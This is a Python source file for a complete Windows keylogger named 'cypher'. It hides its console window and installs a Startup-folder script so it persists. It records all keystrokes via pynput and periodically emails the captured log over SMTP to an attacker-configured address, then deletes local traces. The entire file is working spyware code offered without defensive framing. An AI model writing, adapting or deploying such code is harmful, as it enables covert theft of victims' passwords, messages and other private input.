import logging
import threading
import smtplib
import sys
import os
import os.path
import shutil

try:
    import win32console, win32gui
    win32_installed = True
except ModuleNotFoundError:
    win32_installed = False

try:
    from pynput.keyboard import Key, Listener
    pynput_installed = True
except ModuleNotFoundError:
    pynput_installed = False

from settings import PUBLIC_IP, SMTP_SERVER, TO_ADDR, FROM_ADDR, PASSWORD, EMAIL_INTERVAL, PORT, SUBJECT, EXIT_COMBINATION, CONTENT, USER
from datetime import datetime
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

LOG_FORMAT = "%(levelname)s %(asctime)s %(message)s"
logging.basicConfig(filename = "cypher.log", level = logging.INFO,
                    format = LOG_FORMAT, filemode = "w")
logger = logging.getLogger()

if PUBLIC_IP != None:
    internet_conn = True
    logger.info("Public ip address resolved")
else:
    internet_conn = False
    logger.warning("https://ident.me could not be reached")

active_keys = set()
keys_pressed = 0

# Record keystrokes in cypherlogs.txt
def log(text):
    with open("cypherlogs.txt", "a") as f:
        f.write(str(text))
        f.close()

# Add to system starup
def add_startup():
    # Get file path
    abs_path = sys.argv[0].split("\\")[-1]
    file_name = basename(abs_path)
    curr_dir = os.getcwd()
    
    startup = fr"C:\Users\{USER}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.cmd"

    startup_file = open("start.cmd", "w")
    if not pynput_installed:
        startup_file.write("pip install pynput\n")
    if not win32_installed:
        startup_file.write("pip install pywin32\n")
    startup_file.write(f"cd {curr_dir}\n")
    startup_file.write(f"python {abs_path}")
    startup_file.close()
    shutil.move(curr_dir + "\\start.cmd", startup)
        
# Send email with cypherlogs.txt attached
def send_email():
    # Set messgae header and body
    msg = MIMEMultipart()
    msg["To"] = TO_ADDR
    msg["From"] = FROM_ADDR
    msg["Subject"] = SUBJECT
    body = MIMEText(CONTENT, "plain")
    msg.attach(body)
    logger.info("Email header and body constructed")
    
    # Attach cypherlogs.txt to email
    key_log = "cypherlogs.txt"
    with open(key_log, "r") as f:
        attachment1 = MIMEApplication(f.read(), Name = basename(key_log))
        attachment1["Content-Disposition"] = "attachment"; key_log = f"{basename(key_log)}"
    msg.attach(attachment1)
    logger.info("\"cypherlogs.txt\" attached to email")
    
    # Attach cypher.log to email
    script_log = "cypher.log"
    with open(script_log, "r") as f:
        attachment2 = MIMEApplication(f.read(), Name = basename(script_log))
        attachment2["Content-Disposition"] = "attachment"; script_log = f"{basename(script_log)}"
    msg.attach(attachment2)
    logger.info("\"cypher.log\" attached to email")
    
    # Connect to SMTP server and send message
    server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)
    server.login(FROM_ADDR, PASSWORD)
    logger.info(f"{FROM_ADDR} login successful")
    server.send_message(msg, from_addr = FROM_ADDR, to_addrs = [TO_ADDR])
    logger.info(f"Files sent from {FROM_ADDR} to {TO_ADDR}")
    server.quit()

# Hide terminal
def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True

# Detect keystrokes
def on_press(key):
    if key in EXIT_COMBINATION:
        active_keys.add(key)
        if all(k in active_keys for k in EXIT_COMBINATION):
            listener.stop()
            logger.info("[KEYLOGGER STOP]")
            
    global keys_pressed
    keys_pressed += 1
    
    try:
        log(key.char)
    except AttributeError:
        if key == Key.backspace:
            log("\n[BACKSPACE]\n")
        elif key == Key.tab:
            log("\n[TAB]\n")
        elif key == Key.enter:
            log("\n[ENTER]\n")
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            log("\n[CTRL]\n")
        elif key == Key.shift:
            pass
        elif key == Key.space:
            log(" ")
        else:
            log("\n" + str(key) + "\n")
    
    if keys_pressed == EMAIL_INTERVAL and EMAIL_INTERVAL > 0:
        logger.info("Interval reached")
        t = threading.Thread(target = send_email)
        t.start()
        keys_pressed = 0
    
def on_release(key):
    pass

hide()
add_startup()

# Log start time and date
start_date = datetime.now()
start_minute = str(start_date.minute)
if len(start_minute) == 1:
    start_minute = "0" + start_minute

log("-----------------------------\n")
log(f"Start Time: {start_date.hour}:{start_minute} {start_date.month}/{start_date.day}/{start_date.year}\n")
log("-----------------------------\n")


logger.info("Recording keystrokes...")
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

# Log end time and date
end_date = datetime.now()
end_minute = str(end_date.minute)
if len(end_minute) == 1:
    end_minute = "0" + end_minute

log("-----------------------------\n")
log(f"End Time: {end_date.hour}:{end_minute} {end_date.month}/{end_date.day}/{end_date.year}\n")
log("-----------------------------\n")

# Send email once log is closed
if internet_conn:
    send_email()
    # Clear previous log only if it has aready been sent via email
    
    handlers = logger.handlers[:]
    for handler in handlers:
        logger.removeHandler(handler)
        handler.close()
        
    os.remove("cypherlogs.txt")
    os.remove("cypher.log")
    
else:
    logger.warning("Could not connect to the internet. " \
        "Email will be attempted when the keylogger is stopped again.")